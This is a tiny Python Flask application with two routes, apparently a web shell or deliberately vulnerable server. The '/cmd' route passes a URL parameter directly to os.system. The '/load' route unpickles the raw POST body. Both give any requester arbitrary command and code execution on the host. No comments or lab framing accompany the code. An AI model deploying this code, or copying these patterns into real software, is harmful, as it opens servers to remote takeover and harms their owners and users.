from flask import Flask, request
import os, pickle

app = Flask(__name__)

@app.route('/cmd')
def cmd():
    return os.system(request.args.get('cmd'))

@app.route('/load', methods=['POST'])
def load():
    return str(pickle.loads(request.data))
